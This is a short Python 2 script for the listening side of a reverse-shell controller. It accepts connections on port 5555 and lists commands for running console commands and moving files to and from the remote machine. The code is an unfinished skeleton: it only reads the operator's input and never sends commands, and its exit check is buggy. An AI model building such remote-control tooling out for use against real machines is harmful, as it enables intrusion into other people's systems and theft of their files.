import socket

PORT_NUM = 5555

COMMANDS = {'help':['help'],
            'cmd':['cmd [OPTION] OPTION - console command'],
            'getfile':['getfile [FILEPATH] [LOCALPATH]- get file from remote'],
            'sendfile':['sendfile [LOCALPATH] [REMOTEPATH]- send file to remote'],
            'exit':['stop server'],
           }

class Server(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(socket.SOMAXCONN)
        while True:
            client, address = self.sock.accept()
            print 'recived connection from:',address
            self.consoleWithClient(client, address)
    
    def consoleWithClient(self, client, address):
        command = 'initial'
        while command not in 'exit':
            command = raw_input('reverse_shell:{}>'.format(address))

if __name__ == "__main__":
    print 'hello'
    Server('',PORT_NUM).listen()